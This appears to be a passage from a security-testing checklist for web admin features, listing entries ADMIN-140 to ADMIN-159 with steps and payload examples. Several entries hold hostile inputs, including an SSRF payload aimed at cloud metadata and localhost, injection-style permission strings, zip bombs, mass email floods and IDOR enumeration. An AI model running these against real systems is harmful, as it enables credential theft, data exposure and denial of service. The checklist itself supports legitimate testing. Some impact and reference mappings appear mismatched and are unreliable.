**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feature Toggles

**Test Steps:** 1. Check if feature toggle API is accessible without authentication. 2. Look for feature toggle endpoints that reveal all toggle states. 3. Check for client-side feature toggle configuration.

**Expected Result:** Feature toggle configuration must not be publicly accessible and client-side toggles must not control security-sensitive features.

**Payload Example:**

```
GET /api/features;GET /api/feature-flags;GET /api/config/features without authentication;check JS source for feature flag values
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-140 — Maintenance Mode Race Condition on Activation
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Maintenance Mode

**Test Steps:** 1. Send concurrent maintenance mode activation and deactivation requests. 2. Check for inconsistent state. 3. Test if maintenance mode can be bypassed during transition.

**Expected Result:** Application must implement atomic maintenance mode state changes with proper locking to prevent inconsistent states.

**Payload Example:**

```
Send concurrent PUT /api/admin/maintenance/enable and PUT /api/admin/maintenance/disable simultaneously
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ADMIN-141 — Stack Trace Information Disclosure
**Test Category:** Information Disclosure (WSTG-ERRH-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Trigger various application errors. 2. Check for full stack traces in error responses. 3. Look for file paths and database details and framework versions. 4. Test with different content types.

**Expected Result:** Application must return generic error messages in production without exposing stack traces or internal system details.

**Payload Example:**

```
Send malformed requests to trigger 500;check for file paths;database names;framework versions;library versions in error response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-142 — User Account Lockout Testing
**Test Category:** Authentication (WSTG-ATHN-03) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. As admin check if account lockout is properly configured. 2. Test lockout threshold and duration. 3. Verify admin can unlock accounts. 4. Check if lockout notification is sent to user.

**Expected Result:** Application must provide configurable account lockout policies with proper admin unlock capability and user notification.

**Payload Example:**

```
Trigger lockout by failed logins;verify admin can unlock;check notification;test if lockout applies to admin accounts
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADMIN-143 — Custom Permission String Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. If custom permissions can be created inject special characters or wildcard patterns. 2. Create permission with * or admin.* pattern. 3. Check for permission string parsing vulnerabilities.

**Expected Result:** Application must validate custom permission strings against allowed formats and prevent wildcard or pattern-based permission escalation.

**Payload Example:**

```
Create permission with name=*;create permission=admin.*;permission=../admin/all;permission=${admin}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-144 — System Settings Backup Before Change
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. Change critical system settings. 2. Check if a backup or snapshot is created before the change. 3. Verify rollback capability. 4. Test undo functionality for settings changes.

**Expected Result:** Application must create settings snapshots before critical changes and provide rollback capability with proper version history.

**Payload Example:**

```
Change critical settings then attempt rollback;verify settings history;check for auto-backup before critical changes
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-145 — Audit Log Timestamp Manipulation
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Check if audit log timestamps use server time. 2. Attempt to influence timestamps via client-provided time values. 3. Verify NTP synchronization. 4. Check for timezone consistency.

**Expected Result:** Audit log timestamps must be generated server-side using synchronized UTC time and cannot be influenced by client-provided values.

**Payload Example:**

```
Send requests with manipulated Date headers;check if X-Timestamp header influences log timestamps;verify UTC consistency
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Burp Suite;NTP Tools

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## ADMIN-146 — Monitoring Webhook SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Health Monitoring

**Test Steps:** 1. If health monitoring sends alerts via webhooks configure internal URL as webhook. 2. Trigger health alert. 3. Check if internal service is accessed via monitoring webhook.

**Expected Result:** Application must validate monitoring webhook URLs against allowlists and block internal network access.

**Payload Example:**

```
alert_webhook=http://169.254.169.254/latest/meta-data/;notification_url=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ADMIN-147 — Restore Operation Impact on Active Sessions
**Test Category:** Session Management (WSTG-SESS-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Perform a database restore. 2. Check if active user sessions are properly handled. 3. Verify if restored sessions create security issues. 4. Test for session confusion after restore.

**Expected Result:** Application must invalidate all active sessions after a database restore operation and require all users to re-authenticate.

**Payload Example:**

```
Restore database backup and check if old session tokens from backup become valid;verify session invalidation
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADMIN-148 — Data Migration Progress IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Migration

**Test Steps:** 1. Trigger a data migration. 2. Check migration progress endpoint. 3. Change migration_id to access another tenant's migration progress. 4. Check for data leakage in progress details.

**Expected Result:** Application must enforce tenant isolation on migration progress endpoints and prevent cross-tenant migration data access.

**Payload Example:**

```
GET /api/admin/migration/progress/MIG-2001 with TENANT-1001 credentials;enumerate migration IDs
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-149 — Bulk Email Sending Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bulk Operations

**Test Steps:** 1. If bulk operations include email sending test for mass email capability. 2. Check if external email addresses can be targeted. 3. Test for email bombing prevention. 4. Verify recipient validation.

**Expected Result:** Application must restrict bulk email operations to internal users and implement rate limiting and recipient validation.

**Payload Example:**

```
POST /api/admin/bulk/email with external email addresses;send to 10000+ recipients;check for rate limiting
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-150 — Import Tool Zip Bomb
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Import / Export Tools

**Test Steps:** 1. If import accepts ZIP files upload a zip bomb. 2. Check for file size validation before extraction. 3. Monitor server resources during extraction. 4. Test with nested archives.

**Expected Result:** Application must validate archive contents before extraction and enforce size limits to prevent zip bomb denial-of-service attacks.

**Payload Example:**

```
Upload 42.zip (zip bomb);upload nested ZIP within ZIP within ZIP;upload archive expanding to TB of data
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite;Custom Files

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ADMIN-151 — Email Template Test Send Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Email Templates

**Test Steps:** 1. Use template test send feature. 2. Send test emails to external addresses. 3. Check for rate limiting on test sends. 4. Test for email relay abuse through template testing.

**Expected Result:** Application must restrict template test sends to admin email addresses and implement rate limiting on test send functionality.

**Payload Example:**

```
POST /api/admin/email-templates/test-send with to=arbitrary@external.com;send 1000+ test emails
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-152 — Notification Template Mass Trigger
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Templates

**Test Steps:** 1. If notification templates can be tested trigger mass notifications. 2. Send test notifications to all users. 3. Check for rate limiting on notification testing. 4. Test for notification spam.

**Expected Result:** Application must restrict notification template testing to admin accounts only and implement safeguards against mass notification triggers.

**Payload Example:**

```
POST /api/admin/notification-templates/test with target=all_users;trigger 10000+ test notifications
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-153 — Feature Toggle Dependency Chain Exploitation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feature Toggles

**Test Steps:** 1. If feature toggles have dependencies identify toggle dependency chains. 2. Enable a feature by enabling its dependencies. 3. Create circular toggle dependencies. 4. Test for cascading toggle effects.

**Expected Result:** Application must properly manage feature toggle dependencies and prevent circular dependencies or unintended cascading activations.

**Payload Example:**

```
Enable feature_C which requires feature_B which requires feature_A;create circular dependency A->B->C->A
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-154 — Maintenance Mode Persistent Bypass Token
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Maintenance Mode

**Test Steps:** 1. If maintenance mode has a bypass token for admins capture the token. 2. Check if the token is predictable. 3. Test if the token persists after maintenance mode ends. 4. Check for token leakage.

**Expected Result:** Maintenance mode bypass tokens must be cryptographically random and expire when maintenance mode ends and not be leaked in URLs or headers.

**Payload Example:**

```
Capture X-Maintenance-Bypass token;analyze for predictability;test after maintenance ends;check for token in access logs
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADMIN-155 — Error Log Export Sensitive Data
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Export error logs. 2. Check if exported logs contain more detail than the viewer. 3. Verify sensitive data masking in exports. 4. Check export authorization.

**Expected Result:** Error log exports must apply the same or stricter data masking as the log viewer and require proper authorization.

**Payload Example:**

```
GET /api/admin/error-logs/export check for unmasked passwords;API keys;session tokens;PII in exported file
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-156 — User Impersonation Feature Security
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. If admin can impersonate users test the impersonation feature. 2. Check if impersonation is properly logged. 3. Verify impersonation restrictions. 4. Test if impersonation allows password access. 5. Check for escalation via impersonation.

**Expected Result:** User impersonation must be restricted to authorized super-admins with full audit logging and must not provide access to passwords or allow privilege escalation.

**Payload Example:**

```
POST /api/admin/impersonate/user/1001 with regular admin token;check audit log;attempt to change password while impersonating;escalate privileges
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-157 — System Settings API Key Rotation Check
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. Check if system API keys can be rotated. 2. Rotate keys and verify old keys are invalidated. 3. Check for downtime during rotation. 4. Verify key rotation is logged.

**Expected Result:** System API keys must support zero-downtime rotation with immediate invalidation of old keys and comprehensive audit logging.

**Payload Example:**

```
Rotate system API key;test old key acceptance;verify new key works immediately;check rotation audit log entry
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ADMIN-158 — Audit Log Cross-Tenant Isolation
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Access audit logs as tenant admin. 2. Modify search parameters to include other tenant data. 3. Check pagination for cross-tenant data leakage. 4. Verify strict tenant isolation in log queries.

**Expected Result:** Audit log queries must be scoped to the authenticated tenant with no possibility of cross-tenant data leakage.

**Payload Example:**

```
GET /api/admin/audit-logs?tenant_id=TENANT-2001;set page_size=999999;check for cross-tenant log entries in results
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-159 — Backup Download Rate Limiting
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Attempt to download multiple backups simultaneously. 2. Download the same backup repeatedly. 3. Check for rate limiting on backup downloads. 4. Monitor for bandwidth abuse.

**Expected Result:** Application must implement rate limiting on backup downloads to prevent bandwidth abuse and potential data exfiltration.

**Payload Example:**

```
Send 100+ GET /api/admin/backups/download requests simultaneously;download all available backups rapidly
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;JMeter

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---
